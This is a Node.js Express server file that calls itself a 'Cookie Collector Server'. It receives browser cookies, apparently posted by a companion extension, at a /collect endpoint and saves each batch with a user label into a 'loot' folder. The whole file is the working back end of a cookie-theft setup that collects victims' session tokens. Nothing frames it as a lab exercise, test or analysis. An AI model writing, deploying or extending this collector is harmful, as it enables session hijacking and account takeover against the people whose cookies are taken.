const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Enable CORS so the extension can send data
app.use(cors());

// Increase payload limit because cookie data can be large
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Endpoint to receive cookies
app.post('/collect', (req, res) => {
    const { user, cookies, timestamp } = req.body;

    console.log(`[${new Date().toISOString()}] Received data from ${user || 'Unknown User'}`);
    console.log(`Received ${cookies ? cookies.length : 0} cookies.`);

    // Prepare filename based on timestamp
    const filename = `cookies_${Date.now()}.json`;
    const filepath = path.join(__dirname, 'loot', filename);

    // Create 'loot' directory if it doesn't exist
    if (!fs.existsSync(path.join(__dirname, 'loot'))) {
        fs.mkdirSync(path.join(__dirname, 'loot'));
    }

    // Save to file
    const dataToSave = {
        user,
        timestamp,
        receivedAt: new Date().toISOString(),
        cookieCount: cookies ? cookies.length : 0,
        cookies: cookies
    };

    fs.writeFile(filepath, JSON.stringify(dataToSave, null, 2), (err) => {
        if (err) {
            console.error("Error saving file:", err);
            return res.status(500).json({ status: "error", message: "Failed to save data" });
        }
        console.log(`Saved cookies to ${filepath}`);
        res.json({ status: "success", message: "Data received and saved" });
    });
});

app.get('/', (req, res) => {
    res.send('Cookie Collector Server is Running. Send POST requests to /collect');
});

// Start server
app.listen(PORT, () => {
    console.log(`
    =========================================
    SERVER RUNNING ON http://localhost:${PORT}
    =========================================
    Waiting for incoming data...
    `);
});
